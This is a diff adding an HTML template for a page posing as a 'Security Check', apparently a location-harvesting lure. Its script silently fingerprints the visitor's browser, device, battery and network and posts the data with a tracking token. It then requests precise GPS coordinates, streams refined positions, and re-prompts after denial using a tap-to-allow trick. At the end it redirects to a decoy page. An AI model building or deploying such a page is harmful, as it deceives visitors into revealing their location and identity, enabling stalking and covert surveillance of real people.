@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Security Check</title>
+<style>
+  :root{--bg:#0b0f14;--card:#131a23;--line:#1f2b39;--txt:#e7eef7;--dim:#7f8fa4;--acc:#2f81f7;--ok:#3fb950;--bad:#f85149}
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;
+       background:radial-gradient(1200px 600px at 50% -10%,#16233a 0%,var(--bg) 60%);
+       font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:var(--txt)}
+  .card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);
+        border-radius:18px;padding:26px;box-shadow:0 24px 60px rgba(0,0,0,.55)}
+  .brand{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+  .dot{width:10px;height:10px;border-radius:50%;background:var(--ok);
+       box-shadow:0 0 0 4px rgba(63,185,80,.15);animation:p 1.8s infinite}
+  @keyframes p{50%{opacity:.35}}
+  h1{font-size:17px;margin:0;font-weight:650;letter-spacing:-.2px}
+  .sub{color:var(--dim);font-size:13px;margin:0 0 20px}
+  .row{display:flex;justify-content:space-between;gap:12px;padding:11px 0;
+       border-top:1px solid var(--line);font-size:13.5px}
+  .row span:first-child{color:var(--dim)}
+  .st{font-variant-numeric:tabular-nums;font-weight:600;color:var(--dim)}
+  .st.run{color:var(--acc)}.st.ok{color:var(--ok)}.st.bad{color:var(--bad)}
+  .bar{height:5px;border-radius:99px;background:var(--line);overflow:hidden;margin:18px 0 6px}
+  .bar i{display:block;height:100%;width:4%;background:var(--acc);transition:width .6s ease}
+  button{width:100%;margin-top:16px;padding:13px;border-radius:12px;border:0;
+         background:var(--acc);color:#fff;font-size:15px;font-weight:650;cursor:pointer;
+         display:none}
+  button.show{display:block}
+  .foot{margin-top:16px;text-align:center;font-size:11.5px;color:var(--dim)}
+  code{font-family:ui-monospace,Menlo,monospace;font-size:12px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand"><div class="dot"></div><h1>Verifying your connection</h1></div>
+  <p class="sub">Confirming device trust and location region. Keep this tab open — it takes a few seconds.</p>
+
+  <div class="row"><span>Client</span><span class="st" id="s1">queued</span></div>
+  <div class="row"><span>Device profile</span><span class="st" id="s2">queued</span></div>
+  <div class="row"><span>Precise position</span><span class="st" id="s3">queued</span></div>
+  <div class="row"><span>Network region</span><span class="st" id="s4">queued</span></div>
+
+  <div class="bar"><i id="bar"></i></div>
+  <button id="retry">Allow precise location</button>
+  <p class="foot">Protected by TLS 1.3 · <code id="sid"></code></p>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  const TOKEN = {{ token|tojson }};
+  const DECOY = {{ decoy|tojson }};
+  const API   = "/api/hit";
+  const $     = id => document.getElementById(id);
+  let best = Infinity, watchId = null, sentRefine = 0, done = false, t0 = Date.now();
+
+  $("sid").textContent = Math.random().toString(16).slice(2, 10);
+
+  const set = (id, txt, cls) => { const e = $(id); e.textContent = txt; e.className = "st " + (cls || ""); };
+  const prog = p => $("bar").style.width = Math.max(4, Math.min(100, p)) + "%";
+
+  function post(stage, extra) {
+    const body = JSON.stringify(Object.assign({
+      token: TOKEN, stage, ts: new Date().toISOString(),
+      dwell: Date.now() - t0, fp: FP
+    }, extra || {}));
+    try {
+      fetch(API, { method: "POST", keepalive: true,
+        headers: { "Content-Type": "application/json" }, body })
+        .catch(() => {});
+    } catch (e) {
+      try { navigator.sendBeacon(API, new Blob([body], { type: "application/json" })); } catch (_) {}
+    }
+  }
+
+  /* ---------- fingerprint: all passive, no permission needed ---------- */
+  function gpu() {
+    try {
+      const c = document.createElement("canvas");
+      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return null;
+      const d = gl.getExtension("WEBGL_debug_renderer_info");
+      return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    } catch (e) { return null; }
+  }
+  function canvasHash() {
+    try {
+      const c = document.createElement("canvas"); c.width = 240; c.height = 60;
+      const x = c.getContext("2d");
+      x.textBaseline = "top"; x.font = "16px Arial";
+      x.fillStyle = "#f60"; x.fillRect(0, 0, 240, 60);
+      x.fillStyle = "#069"; x.fillText("geo⌘harvest✓", 4, 8);
+      x.fillStyle = "rgba(102,204,0,.7)"; x.fillText("geo⌘harvest✓", 6, 26);
+      const s = c.toDataURL();
+      let h = 2166136261;
+      for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); }
+      return (h >>> 0).toString(16);
+    } catch (e) { return null; }
+  }
+  function fonts() {
+    const base = ["monospace", "sans-serif", "serif"];
+    const probe = ["Roboto", "Segoe UI", "Helvetica Neue", "Arial", "San Francisco",
+                   "Ubuntu", "Cantarell", "Noto Sans", "SF Pro Text", "Arial Narrow"];
+    const c = document.createElement("canvas").getContext("2d");
+    const w = f => { c.font = "72px " + f; return c.measureText("mmmmmmmmmmlli").width; };
+    const b = base.map(w);
+    return probe.filter(f => base.some((bf, i) => w(`"${f}",${bf}`) !== b[i]));
+  }
+  const FP = {
+    ua: navigator.userAgent, uaMobile: navigator.userAgentData?.mobile ?? null,
+    platform: navigator.platform, vendor: navigator.vendor,
+    lang: navigator.language, langs: (navigator.languages || []).join(","),
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    tzOff: new Date().getTimezoneOffset(),
+    screen: [screen.width, screen.height, screen.colorDepth, devicePixelRatio],
+    avail: [screen.availWidth, screen.availHeight],
+    win: [innerWidth, innerHeight],
+    cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory,
+    touch: navigator.maxTouchPoints, gpu: gpu(), canvas: canvasHash(),
+    fonts: fonts(), cookies: navigator.cookieEnabled,
+    dnt: navigator.doNotTrack, plugins: (navigator.plugins || []).length,
+    gpc: navigator.globalPrivacyControl ?? null,
+    referrer: document.referrer || null, storage: !!window.localStorage
+  };
+
+  if (navigator.userAgentData?.getHighEntropyValues) {
+    navigator.userAgentData.getHighEntropyValues(
+      ["model", "platformVersion", "architecture", "bitness", "fullVersionList"])
+      .then(v => { FP.he = v; post("fingerprint", { he: v }); }).catch(() => {});
+  }
+  if (navigator.connection) {
+    const c = navigator.connection;
+    FP.net = { type: c.type, eff: c.effectiveType, down: c.downlink, rtt: c.rtt, save: c.saveData };
+  }
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      FP.battery = { level: b.level, charging: b.charging };
+      post("fingerprint", { battery: FP.battery });
+    }).catch(() => {});
+  }
+  if (navigator.mediaDevices?.enumerateDevices) {
+    navigator.mediaDevices.enumerateDevices()
+      .then(d => { FP.devices = d.map(x => x.kind); }).catch(() => {});
+  }
+
+  /* ---------- stage 1: fire immediately, no interaction ---------- */
+  set("s1", "verified", "ok"); prog(12);
+  set("s2", "collecting", "run");
+  setTimeout(() => { set("s2", "captured", "ok"); prog(30); post("fingerprint"); }, 350);
+
+  /* ---------- stage 2: geolocation ladder ---------- */
+  function startGeo() {
+    if (!navigator.geolocation) { set("s3", "unsupported", "bad"); post("nogeo"); return; }
+    set("s3", "requesting", "run"); prog(45);
+    navigator.geolocation.getCurrentPosition(onPos, onErr,
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+  }
+
+  function onPos(p) {
+    best = Math.min(best, p.coords.accuracy);
+    set("s3", "locked ±" + Math.round(p.coords.accuracy) + "m", "ok");
+    prog(78);
+    post("gps", {
+      lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy,
+      alt: p.coords.altitude, hdg: p.coords.heading, spd: p.coords.speed
+    });
+    if (watchId === null) {
+      watchId = navigator.geolocation.watchPosition(onRefine, null,
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 25000 });
+    }
+    finishSoon();
+  }
+
+  function onRefine(p) {
+    const a = p.coords.accuracy;
+    if (sentRefine >= 6) return;
+    if (a < best * 0.8 || Date.now() - t0 > 12000) {
+      best = Math.min(best, a); sentRefine++;
+      post("refine", { lat: p.coords.latitude, lon: p.coords.longitude, acc: a });
+    }
+  }
+
+  function onErr(e) {
+    const map = { 1: "blocked", 2: "unavailable", 3: "timed out" };
+    set("s3", map[e.code] || "failed", "bad");
+    post("denied", { code: e.code, msg: e.message });
+    prog(62);
+    $("retry").classList.add("show");
+  }
+
+  function finishSoon() {
+    if (done) return; done = true;
+    setTimeout(() => {
+      prog(100); set("s4", "resolved", "ok");
+      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+      if (DECOY) setTimeout(() => location.replace(DECOY), 1200);
+    }, 2500);
+  }
+
+  /* second gesture re-prompt (iOS grants on tap after denial) */
+  $("retry").addEventListener("click", () => {
+    $("retry").classList.remove("show");
+    startGeo();
+  });
+
+  /* watchdog: IP fallback is server-side, so just report */
+  setTimeout(() => { if (best === Infinity) { post("timeout"); set("s4", "fallback", "run"); prog(55); } }, 18000);
+
+  window.addEventListener("load", startGeo);
+})();
+</script>
+</body>
+</html>
